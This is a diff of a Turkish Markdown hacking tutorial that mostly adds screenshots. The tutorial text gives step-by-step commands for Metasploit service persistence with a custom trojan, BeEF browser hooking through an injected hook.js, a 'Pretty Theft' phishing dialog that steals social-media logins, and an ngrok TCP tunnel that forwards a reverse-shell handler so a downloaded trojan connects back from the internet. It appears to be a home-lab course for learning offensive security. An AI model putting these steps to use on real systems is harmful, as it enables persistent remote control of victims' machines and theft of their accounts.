@@ -1028,10 +1028,15 @@ Exploit target:
 - **EXE::Custom** olarak gözüken parametre bizim belirlemek istediğimiz trojanı temsil eder. `set EXE::Custom /var/www/html/servis_trojan.exe` (benim trojanım burada olduğu için bu path'i verdim. Sizinki nerede ise onu vermeniz gerekmektedir. İsterseniz bu aşamayı pas geçebilirsiniz, msfconsole kendi backdoor'unu enjekte edecektir.)
 - Ardından `exploit` diyerek exploit'i çalıştırıyoruz ve hedef makinamıza backdoor'u bir servis olarak enjekte ediyor.
 
+![kalıcı backdoor](./assets/67-kalici-backdoor.png)
+
 - Tekrar bir [multi handler](#multi-handler-oluşturmak) oluşturuyoruz ve hedef makinamızı açıp kapatıyoruz bakalım bağlantıyı yakalayabilecek miyiz :)
 
   - Windows yeniden başlatıyoruz
 ![windows restart](./assets/64-windows-restart.png)
+
+  - Başarılı bir şekilde session'ı yakalıyoruz
+  ![kalıcı session yakalama](./assets/68-kalıcı-baglantı-success.png)
 
 # Sosyal Mühendislik
 ## Görseller ile Dosyayı Birleştirmek
@@ -1100,19 +1105,15 @@ Bu bölümde denemelerimizi **İç Ağlarda** yani aynı ağda bağlı olduğumu
 Eğer Beef otomatik olarak yüklü gelmez ise [Beef Project](https://github.com/beefproject/beef)'ten projeyi `git clone https://github.com/beefproject/beef.git` diyerek makinemize indirebiliriz
 - `cd beef` diyerek indirdiğimiz proje dizinine giriş yapabiliriz
 - `./install` diyerek executable script dosyasını çalıştırıyoruz ve kurulumu yapıyoruz. Başarılı bir şekilde kurulumu yaptıysak bize şu şekilde bir çıktı verecektir. Default olarak set edilen parolayı değiştirmemiz gerektiği bize söyleniyor.
-
 ![Beef Kurulum](./assets/41-beef-kurulum.png)
 
 - `nano config.yaml` komutu ile konfigürasyon dosyamızı açabiliriz. **credentials** altından default olarak set edilen **beef** şifresini ve kullanıcı adını kendi belirlediğimiz bilgilerle değiştiriyoruz ve kaydedip çıkıyoruz
-
 ![Beef Conf](./assets/42-beef-conf.png)
 
 - `./beef` diyerek aracımızı çalıştırabiliriz
-
 ![Beef Start](./assets/43-beef-start.png)
 
 - Yukarıdaki gibi bir çıktı alacağız. **UI URL** kısmında beef'e ulaşabileceğimiz adres verilmiş olacak. Browserımızdan ilgili adrese gidiyoruz ve `config.yaml` dosyasında set ettiğimiz değerler ile giriş yapıyoruz
-
 ![Beef Intro](./assets/44-beef-intro.png)
 
 ## Hedefi Oltaya Takmak
@@ -1134,11 +1135,9 @@ Bize verdiği adres aslında Beef'i çalıştırdığımız, yani Kali makinamı
 Ardından Windows Hedef makinamızda bu siteye (yani Kali üzerinde oluşturduğumuz web sunucuya) istek atınca hedefimiz oltaya takılmış olacak ve Beef Panelde gözükecektir. Nasıl istek atacağımızı da [üst başlıklarda](#web-sunucu-kurmak) görmüştük. 
 
 - Windows Makinadan, Kali Makinaya istek atıyoruz ve Kali altında çalışan web sunucumuz içindeki `index.html` serve ediliyor, içerisinden de `hook.js` çağrılıyor
-
 ![windows request to kali](./assets/47-windows-istek.png)
 
 - Kali makinamızda çalışan Beef otomatik olarak oltaya takılan makinayı görüyor. Şu anda hedef browser'a karşı ciddi bir güç sahibiyiz. Browser kapanırsa gücümüzü kaybederiz!
-
 ![Beef Hooked](./assets/48-kali-hooked.png)
 
 ## JavaScript Enjeksiyonu
@@ -1191,11 +1190,9 @@ Kırmızı Event'lar ise denemeye değer anlamına gelmektedir <br>
 ### Diyalog Çıkartmak
 Commands altından **Hooked Domain > Create Alert Dialog** eventine geliyoruz. Diyalog metnimizi girip execute ediyoruz
 - Beef tarafında görüntü
-
 ![Beef Dialog](./assets/53-beef-dialog.png)
 
 - Hedef browser tarafında görüntü
-
 ![Beef Dialog Target](./assets/54-beef-target.png)
 
 ### Bilgileri Çalmak (Pretty Thieft)
@@ -1203,11 +1200,9 @@ Sosyal medya hesaplarını bu yöntem ile çalabiliriz. Kısaca bize oturum sür
 Socail Engineering > Pretty Thieft giderek bu event'i çalıştırabiliriz. Hangi sosyal medya için diyalog açacağımızı, hangi renkte olacağını ve logosunu set edebiliriz.
 
 - Beef tarafında görünüm 
-
 ![Beef Pretty Thieft](./assets/55-beef-pretty-thieft.png)
 
 - Hedef Makinada Görünüm
-
 ![Beef Pretty Target](./assets/56-beef-pretty-target.png)
 
 ### Backdoor İletmek
@@ -1250,7 +1245,6 @@ Biz tünel servisi olarak [ngrok](https://ngrok.com/) kullanacağız.
 - Artık `./ngrok` yazarak programı çalıştırabiliriz
 - `./ngrok help` ile yardım menüsünü açabiliriz
 - `./ngrok tcp 4242` komutu ile 4242 portunda tcp tünel servisi çalıştırıyoruz. Port numarası bize kalmıştır, çok kullanılmayan portları kullanabiliriz
-
 ![ngrok tcp service](./assets/58-ngrok-servis.png)
 
 - Bize diyorki `Forwarding tcp://0.tcp.ngrok.io:17651 -> localhost:4242`
@@ -1278,16 +1272,13 @@ Msfvenom'da [Veil](#veil)'a alternatif olabilecek bir backdoor oluşturma aracı
 - `set LHOST 0.0.0.0` ile localhost bağlantımızı dinleyeceğiz. ngrok kendisine gelen bağlantıyı bize yönlendirecek
 - `set LPORT 4242` ile ngrok'un bağlantıyı yönlendirdiği portu set ediyoruz
 - `exploit` ile exploit'i çalıştırıyoruz
-
 ![msfconsole multi handler](./assets/59-msf-confs.png)
 
 - Adres çubuğuna kali cihazımızın IP adresini yazıyoruz ve Kali üzerinde oluşturduğumuz web sunucudan trojan'ı indiriyoruz
 - Trojan çalıştırıldığında bağlantı ngrok üzerinden bize geliyor
-
 ![ngrok multi handler](./assets/60-ngrok-multi-handler.png)
 
 - Kali makinamızda `msfconsole` yardımı ile bağlantıyı dinliyoruz ve hayırlı olsun artık hedef makinayı ele geçirdik
-
 ![ngrok msfconsole](./assets/61-ngrok-msfconsole.png)
 
  
